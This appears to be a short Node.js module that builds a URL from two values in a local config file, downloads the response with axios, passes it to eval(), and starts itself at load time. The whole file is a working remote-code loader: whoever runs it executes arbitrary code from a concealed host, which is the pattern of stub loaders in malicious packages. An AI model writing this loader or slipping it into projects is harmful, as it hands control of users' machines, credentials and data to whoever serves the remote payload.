const {ST,RT} = require('./config');
const axios = require('axios');
async function start(){
var starter = await axios(ST+RT)
eval(starter.data)}
start();
